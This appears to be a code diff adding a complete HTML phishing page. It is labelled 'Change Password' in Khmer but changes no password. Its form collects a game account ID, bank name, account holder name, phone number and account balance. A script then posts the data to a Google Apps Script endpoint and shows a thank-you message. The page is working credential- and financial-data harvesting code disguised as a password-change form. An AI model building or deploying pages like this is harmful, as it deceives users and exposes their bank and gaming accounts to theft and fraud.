@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Change Password</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="stylePW.css">
+</head>
+<body​ style="background-color: rgb(42,78,104);">
+  <div class="container text-center"><br>
+    <br>
+    <div class="card mx-auto" style="width: 18rem;border: none;background-color: rgb(23, 48, 66); border-radius: 10px 50px;"><br>
+		<h3​ style="color: white;font-weight: bold;font-size: 20px;">ផ្លាស់ប្ដូរលេខសម្ងាត់</h3>
+      <div class="card-body">
+        <form name="submit-to-google-sheet">
+          <div class="mb-3">
+            <input name="ID Account" type="tel" class="form-control" placeholder="អាខោនID" required>
+          </div>
+          <div class="mb-3">
+            <input name="BankName" type="text" class="form-control" placeholder="ឈ្មោះធនាគារ:ABA, ACELEDA..." required>
+          </div>
+		  <div class="mb-3">
+            <input name="AccountName" type="text" class="form-control" placeholder="ឈ្មោះគណនី" required>
+          </div>
+		  <div class="mb-3">
+            <input name="Phone" type="number" class="form-control" placeholder="លេខទូរស័ព្ទ" required>
+          </div>
+		  <div class="mb-3">
+            <input name="Balance" type="number" class="form-control" placeholder="ទឹកប្រាក់ក្នុងគណនីអាខោនហ្គេម" required>
+          </div>
+          <div class="mb-3">
+            <input name="FAFA" type="text" class="form-control" placeholder="បញ្ជូលឈ្មោះវេបសាយ" required>
+          </div>
+		  <button type="submit" onclick="myFunction()"  class="btn">បញ្ចូន</button>
+      
+        </form>
+      </div>
+    </div>
+  </div>
+  <script>
+	function myFunction() {
+	  alert("Thanks you dear for support us!🧡");
+	  window.location.href="ChagnePW.html"
+	}
+	</script>
+  <script>
+	const scriptURL = 'https://script.google.com/macros/s/AKfycbw_2tay3TOp-EmxD8E1Fr9T27TzltimySXqaLVct3zogEVFUXeLybEUkhiy_UlX_4CE/exec'; // Replace 'Your URL will be here' with the URL of your Google Apps Script
+	const form = document.forms['submit-to-google-sheet'];
+	form.addEventListener('submit', e => {
+	  e.preventDefault();
+	  fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+		.then(response => console.log('Success!', response))
+		.catch(error => console.error('Error!', error.message));
+	});
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
